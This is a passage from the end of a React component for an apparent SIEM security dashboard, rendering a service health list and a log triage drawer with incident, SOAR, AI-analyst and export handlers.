              </div>

              <ShieldCheck size={18} />
            </div>

            <div className="siem-v2-health-list">
              {HEALTH.map((item) => (
                <div key={item.name}>
                  <span>{item.name}</span>
                  <b>{item.status}</b>
                </div>
              ))}
            </div>
          </div>
        </section>
      )}

      {triageOpen && (
        <SIEMTriageDrawer
          log={selectedLog}
          notice={triageNotice}
          onClose={() => setTriageOpen(false)}
          onCreateIncident={createIncidentDraft}
          onRunSOAR={runSOARDraft}
          onAskAI={askAIAnalyst}
          onExport={exportTriagePackage}
        />
      )}
    </div>
  );
}